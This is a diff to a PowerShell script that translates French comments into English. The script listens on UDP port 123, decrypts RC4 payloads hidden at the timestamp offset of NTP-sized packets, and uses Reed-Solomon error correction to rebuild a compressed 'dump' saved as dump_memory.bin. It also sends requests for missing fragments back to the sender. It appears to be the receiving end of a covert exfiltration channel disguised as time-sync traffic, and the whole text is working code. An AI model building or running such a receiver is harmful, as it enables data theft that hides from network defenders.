@@ -1,11 +1,11 @@
-# Paramètres globaux
-$BLOCK_SIZE         = 10          # Nombre de fragments data par bloc pour RS
-$FRAGMENT_SIZE      = 2           # Chaque fragment contient 2 octets utiles
-$RC4_KEY            = [System.Text.Encoding]::ASCII.GetBytes("MySecretKey")  # Même clé que le client
-$BASE_TIMEOUT       = 432000         # Timeout global en secondes
-$SOCKET_RCVBUF_SIZE = 1 -shl 20   # Taille du buffer
+# Global parameters
+$BLOCK_SIZE         = 10          # Number of data fragments per RS block
+$FRAGMENT_SIZE      = 2           # Each fragment contains 2 useful bytes
+$RC4_KEY            = [System.Text.Encoding]::ASCII.GetBytes("MySecretKey")  # Same key as the client
+$BASE_TIMEOUT       = 432000      # Global timeout in seconds (5 days)
+$SOCKET_RCVBUF_SIZE = 1 -shl 20   # Buffer size
 
-# Fonction de logging
+# Logging function
 function Write-Log {
     param(
         [string]$Level,
@@ -14,7 +14,7 @@ function Write-Log {
     Write-Host "$(Get-Date -Format o) [$Level] $Message"
 }
 
-# --- Initialisation de GF(256) pour Reed-Solomon ---
+# --- GF(256) initialization for Reed–Solomon ---
 $GF_EXP = New-Object int[] 512
 $GF_LOG = New-Object int[] 256
 
@@ -44,7 +44,7 @@ function GF-Inv($a) {
     return $GF_EXP[255 - $GF_LOG[$a]]
 }
 
-# --- Fonctions RC4 ---
+# --- RC4 functions ---
 function RC4-Init($key) {
     $S = 0..255
     $j = 0
@@ -74,8 +74,9 @@ function RC4-Stream($S, $length) {
 }
 
 function RC4-Decrypt($encrypted, $key, $skip) {
+    # Decrypt RC4 after skipping $skip bytes of keystream
     $S = RC4-Init $key
-    [void](RC4-Stream $S $skip)  # Sauter $skip octets
+    [void](RC4-Stream $S $skip)
     $keystream = RC4-Stream $S $encrypted.Length
     $result = New-Object byte[] ($encrypted.Length)
     for ($i = 0; $i -lt $encrypted.Length; $i++) {
@@ -85,6 +86,7 @@ function RC4-Decrypt($encrypted, $key, $skip) {
 }
 
 function Try-Decrypt($encrypted, $key, $skip) {
+    # Attempt decryption and extract 32-bit value
     $decrypted = RC4-Decrypt $encrypted $key $skip
     $valBytes = $decrypted[0..3]
     [array]::Reverse($valBytes)
@@ -93,17 +95,19 @@ function Try-Decrypt($encrypted, $key, $skip) {
 }
 
 function Deduce-Skip($encrypted, $key, $total_fragments, $is_fec) {
+    # Determine the RC4 skip value by testing all possibilities
     for ($skip = 0; $skip -lt 256; $skip++) {
         $result = Try-Decrypt $encrypted $key $skip
         $val = $result.Value
+        $seq = $val -shr 16
         if (-not $is_fec) {
-            $seq = $val -shr 16
+            # Data packets: sequence number must be < total_fragments
             if ($seq -lt $total_fragments) {
                 return @{ Skip = $skip; Value = $val }
             }
         }
         else {
-            $seq = $val -shr 16
+            # FEC packets: sequence number should be >= total_fragments
             if ($seq -ge $total_fragments) {
                 return @{ Skip = $skip; Value = $val }
             }
@@ -112,9 +116,10 @@ function Deduce-Skip($encrypted, $key, $total_fragments, $is_fec) {
     return $null
 }
 
-# --- Décodage RS (Élimination de Gauss sur GF(256)) ---
+# --- RS decoding (Gaussian elimination over GF(256)) ---
 function RS-Solve($equations, $k) {
     $n = $equations.Count
+    # Build augmented matrix A|b
     $A = @()
     foreach ($eq in $equations) {
         $rowList = $eq.Row.Clone()
@@ -130,15 +135,18 @@ function RS-Solve($equations, $k) {
             }
         }
         if ($pivot_row -eq $null) {
-            throw "Système singulier, pas assez d'équations indépendantes"
+            throw "Singular system, not enough independent equations"
         }
+        # Swap pivot row
         $temp = $A[$col]
         $A[$col] = $A[$pivot_row]
         $A[$pivot_row] = $temp
+        # Normalize pivot row
         $inv_val = GF-Inv $A[$col][$col]
         for ($j = $col; $j -le $k; $j++) {
             $A[$col][$j] = GF-Mul $A[$col][$j] $inv_val
         }
+        # Eliminate other rows
         for ($row = 0; $row -lt $n; $row++) {
             if (($row -ne $col) -and ($A[$row][$col] -ne 0)) {
                 $factor = $A[$row][$col]
@@ -148,6 +156,7 @@ function RS-Solve($equations, $k) {
             }
         }
     }
+    # Extract solution
     $solution = @()
     for ($i = 0; $i -lt $k; $i++) {
         $solution += $A[$i][$k]
@@ -156,6 +165,7 @@ function RS-Solve($equations, $k) {
 }
 
 function Build-Equations($block_data, $fec_data, $k_block, $pos) {
+    # Build the system of equations for Reed–Solomon decoding
     $equations = @()
     foreach ($i in $block_data.Keys) {
         $row = New-Object int[] ($k_block)
@@ -177,9 +187,10 @@ function Build-Equations($block_data, $fec_data, $k_block, $pos) {
 }
 
 function RS-Decode-Block($block_data, $fec_data, $k_block) {
+    # Decode one block of up to k_block fragments in two byte positions
     $eq0 = Build-Equations $block_data $fec_data $k_block 0
     if ($eq0.Count -lt $k_block) {
-        throw "Pas assez d'équations pour résoudre RS"
+        throw "Not enough equations to solve RS"
     }
     $sol0 = RS-Solve ($eq0[0..($k_block - 1)]) $k_block
 
@@ -196,7 +207,7 @@ function RS-Decode-Block($block_data, $fec_data, $k_block) {
     return $recovered
 }
 
-# --- Fonction de décompression Zlib ---
+# --- Zlib decompression function ---
 function Decompress-Zlib {
     param(
         [byte[]]$data
@@ -219,7 +230,7 @@ function Decompress-Zlib {
     return $outStream.ToArray()
 }
 
-# --- Réception et réassemblage du dump ---
+# --- Reception and reassembly of the dump ---
 function Run-Receiver {
     param(
         [string]$listenHost,
@@ -227,7 +238,7 @@ function Run-Receiver {
         [string]$output_file,
         [int]$base_timeout = 120
     )
-    # Création du client UDP
+    # Create UDP client
     $udpClient = New-Object System.Net.Sockets.UdpClient($port)
     $udpClient.Client.ReceiveTimeout = 5000
     Write-Log "INFO" "Listening on ${listenHost}:${port} ..."
@@ -235,8 +246,8 @@ function Run-Receiver {
     $header_received = $false
     $total_fragments = 0
     $total_size = 0
-    $data_packets = @{}   # Hashtable : numéro global -> [byte[2]]
-    $fec_packets  = @{}   # Hashtable : clé "block_index_idx" -> [byte[2]]
+    $data_packets = @{}   # Hashtable: global sequence -> byte[2]
+    $fec_packets  = @{}   # Hashtable: "block_index_idx" -> byte[2]
     $start_time   = Get-Date
     $sender_addr  = $null
 
@@ -260,9 +271,10 @@ function Run-Receiver {
 
         if ($data.Length -lt 48) { continue }
 
-        # Extraction du payload (8 octets) à partir de l'offset 40
+        # Extract the 8-byte payload from offset 40
         $payload = $data[40..47]
         if (-not $header_received) {
+            # First payload: header with fragment count and total size
             $fragBytes = $payload[0..3]
             [array]::Reverse($fragBytes)
             $total_fragments = [BitConverter]::ToUInt32($fragBytes, 0)
@@ -274,30 +286,29 @@ function Run-Receiver {
             continue
         }
 
-        # Pour les paquets suivants, les octets 4 à 7 contiennent les données chiffrées
+        # For subsequent packets, bytes 4..7 are RC4-encrypted fragment data
         $encrypted = $payload[4..7]
         $result = Deduce-Skip $encrypted $RC4_KEY $total_fragments $false
         if ($result) {
-            $skip = $result.Skip
-            $val  = $result.Value
-            $seq  = $val -shr 16
-            $fragVal = $val -band 0xFFFF
-            $fragBytes = [System.BitConverter]::GetBytes([UInt16]$fragVal)
+            # Data packet
+            $seq  = $result.Value -shr 16
+            $fragVal = $result.Value -band 0xFFFF
+            $fragBytes = [BitConverter]::GetBytes([UInt16]$fragVal)
             [array]::Reverse($fragBytes)
             $data_packets[$seq] = $fragBytes
             $progress = ($data_packets.Count / $total_fragments) * 100
             Write-Log "INFO" "Progress: $($data_packets.Count)/$total_fragments fragments received ($([Math]::Round($progress,1))%)"
         }
         else {
+            # Try FEC packet
             $resultFec = Deduce-Skip $encrypted $RC4_KEY $total_fragments $true
             if ($resultFec) {
-                $skip = $resultFec.Skip
                 $fec_seq = $resultFec.Value
                 $seq_high = $fec_seq -shr 16
                 $block_index = [Math]::Floor($seq_high / $BLOCK_SIZE)
                 $idx_in_block = $seq_high % $BLOCK_SIZE
                 $fragVal = $fec_seq -band 0xFFFF
-                $fragBytes = [System.BitConverter]::GetBytes([UInt16]$fragVal)
+                $fragBytes = [BitConverter]::GetBytes([UInt16]$fragVal)
                 [array]::Reverse($fragBytes)
                 $key = "$block_index`_$idx_in_block"
                 $fec_packets[$key] = $fragBytes
@@ -316,7 +327,7 @@ function Run-Receiver {
     $udpClient.Close()
     Write-Log "INFO" "Reception finished: $($data_packets.Count)/$total_fragments data packets received."
 
-    # Réassemblage du dump par blocs
+    # Reassemble dump by blocks
     $num_blocks = [Math]::Ceiling($total_fragments / $BLOCK_SIZE)
     $reconstructed = New-Object byte[] ($total_fragments * $FRAGMENT_SIZE)
     Write-Log "INFO" "Reconstructing dump ..."
@@ -380,6 +391,7 @@ function Run-Receiver {
     }
     Write-Host ""
     
+    # Trim to actual compressed size and decompress
     $reconstructed = $reconstructed[0..($total_size - 1)]
     try {
         $dump_data = Decompress-Zlib $reconstructed
@@ -393,6 +405,7 @@ function Run-Receiver {
         Write-Log "INFO" "Compressed dump saved to '$compressed_file'."
     }
     
+    # Send feedback for any remaining missing fragments
     $missing_fragments = @()
     for ($i = 0; $i -lt $total_fragments; $i++) {
         if (-not $data_packets.ContainsKey($i)) {
@@ -402,11 +415,11 @@ function Run-Receiver {
     if (($missing_fragments.Count -gt 0) -and $sender_addr) {
         Write-Log "INFO" "Missing fragments after RS: $missing_fragments"
         $feedback = New-Object System.Collections.Generic.List[byte]
-        $countBytes = [System.BitConverter]::GetBytes([UInt32]$missing_fragments.Count)
+        $countBytes = [BitConverter]::GetBytes([UInt32]$missing_fragments.Count)
         [array]::Reverse($countBytes)
         $feedback.AddRange($countBytes)
         foreach ($seq in $missing_fragments) {
-            $seqBytes = [System.BitConverter]::GetBytes([UInt32]$seq)
+            $seqBytes = [BitConverter]::GetBytes([UInt32]$seq)
             [array]::Reverse($seqBytes)
             $feedback.AddRange($seqBytes)
         }
@@ -426,10 +439,10 @@ function Run-Receiver {
     }
 }
 
-# --- Programme principal ---
+# --- Main execution ---
 Init-GF
-$listenHost = "0.0.0.0"      # Écoute sur toutes les interfaces
-$port = 123                # Port UDP (attention aux privilèges sur certains ports)
+$listenHost = "0.0.0.0"  # Listen on all interfaces
+$port       = 123        # UDP port (requires privileges on some ports)
 $output_file = "dump_memory.bin"
 
 Run-Receiver -listenHost $listenHost -port $port -output_file $output_file -base_timeout $BASE_TIMEOUT
